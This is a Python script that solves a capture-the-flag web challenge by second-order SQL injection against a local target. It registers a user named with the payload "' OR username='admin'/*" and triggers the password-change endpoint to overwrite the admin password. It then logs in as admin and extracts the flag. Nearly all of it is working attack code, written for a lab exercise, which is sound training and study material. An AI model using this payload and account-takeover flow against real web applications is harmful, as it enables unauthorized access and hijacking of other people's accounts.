#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
atexit.register(lambda: print("作者 ZluxYao"))
"""
Challenge 05 second-order SQL injection runner.

Flow:
1. Register a user whose username contains the second-order SQLi payload.
2. Log in as that user so the vulnerable change-password endpoint uses it.
3. Change password, causing the stored username to affect admin.
4. Log in as admin with the new password.
5. Fetch admin.php and extract TOGOGO-flag{...}.
"""

import argparse
import os
import random
import re
import string
import sys
from urllib.parse import urljoin

import requests

os.environ["NO_PROXY"] = "*"

DEFAULT_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:33495/")
DEFAULT_OLD_PASS = "oldpass123"
DEFAULT_NEW_PASS = "NewPass123456"
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")


def make_session() -> requests.Session:
    session = requests.Session()
    session.trust_env = False
    session.headers.update(
        {
            "User-Agent": "gkdctf-05-runner/1.0",
            "Content-Type": "application/x-www-form-urlencoded",
        }
    )
    return session


def normalize_base_url(url: str) -> str:
    return url.rstrip("/") + "/"


def random_token(length: int = 6) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def make_evil_user() -> str:
    # Random prefix keeps the script repeatable when the challenge rejects
    # duplicate usernames. The injected part preserves the original 5.sh logic.
    return f"pwn_{random_token()}' OR username='admin'/*"


def extract_flag(*texts: str) -> str | None:
    for text in texts:
        match = FLAG_RE.search(text or "")
        if match:
            return match.group(0)
    return None


def preview(text: str, max_len: int = 220) -> str:
    text = re.sub(r"\s+", " ", text or "").strip()
    if len(text) <= max_len:
        return text
    return text[:max_len] + "..."


def post_form(
    session: requests.Session,
    base_url: str,
    endpoint: str,
    data: dict[str, str],
    timeout: float,
) -> requests.Response:
    url = urljoin(base_url, endpoint)
    return session.post(url, data=data, timeout=timeout)


def get_page(
    session: requests.Session,
    base_url: str,
    endpoint: str,
    timeout: float,
) -> requests.Response:
    url = urljoin(base_url, endpoint)
    return session.get(url, timeout=timeout)


def show_step(name: str, resp: requests.Response, show_body: bool = False) -> None:
    print(f"[*] {name}: HTTP {resp.status_code}, len={len(resp.text)}")
    if show_body or resp.status_code >= 400:
        print(f"    {preview(resp.text)}")


def solve(args: argparse.Namespace) -> str | None:
    base_url = normalize_base_url(args.url)
    evil_user = args.evil_user or make_evil_user()

    attacker = make_session()
    admin = make_session()

    print(f"[*] Target: {base_url}")
    print(f"[*] Evil username: {evil_user}")
    print(f"[*] New admin password: {args.new_pass}")

    print("\n[1] Register evil user")
    resp = post_form(
        attacker,
        base_url,
        "register.php",
        {"username": evil_user, "password": args.old_pass},
        args.timeout,
    )
    show_step("register.php", resp, args.show_body)

    print("\n[2] Login as evil user")
    resp = post_form(
        attacker,
        base_url,
        "login.php",
        {"username": evil_user, "password": args.old_pass},
        args.timeout,
    )
    show_step("login.php (evil)", resp, args.show_body)
    flag = extract_flag(resp.text)
    if flag:
        return flag

    print("\n[3] Trigger second-order SQL injection via change.php")
    resp = post_form(
        attacker,
        base_url,
        "change.php",
        {"newpass": args.new_pass},
        args.timeout,
    )
    show_step("change.php", resp, args.show_body)
    flag = extract_flag(resp.text)
    if flag:
        return flag

    print("\n[4] Login as admin with changed password")
    resp = post_form(
        admin,
        base_url,
        "login.php",
        {"username": "admin", "password": args.new_pass},
        args.timeout,
    )
    show_step("login.php (admin)", resp, args.show_body)
    flag = extract_flag(resp.text)
    if flag:
        return flag

    print("\n[5] Fetch admin page")
    resp = get_page(admin, base_url, "admin.php", args.timeout)
    show_step("admin.php", resp, True)

    cookie_text = "; ".join(f"{k}={v}" for k, v in admin.cookies.items())
    return extract_flag(resp.text, cookie_text)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run challenge 05 second-order SQLi flow")
    parser.add_argument("--url", default=DEFAULT_URL, help=f"target base URL, default: {DEFAULT_URL}")
    parser.add_argument("--evil-user", default="", help="custom stored SQLi username")
    parser.add_argument("--old-pass", default=DEFAULT_OLD_PASS, help="password for the evil user")
    parser.add_argument("--new-pass", default=DEFAULT_NEW_PASS, help="password to set for admin")
    parser.add_argument("--timeout", type=float, default=8.0, help="HTTP timeout in seconds")
    parser.add_argument("--show-body", action="store_true", help="print response previews for each step")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    try:
        flag = solve(args)
    except requests.RequestException as exc:
        print(f"\n[-] Request failed: {exc}", file=sys.stderr)
        return 1

    if not flag:
        print("\n[-] Flag not found. Re-run with --show-body to inspect responses.")
        return 2

    print(f"\n[+] FLAG: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
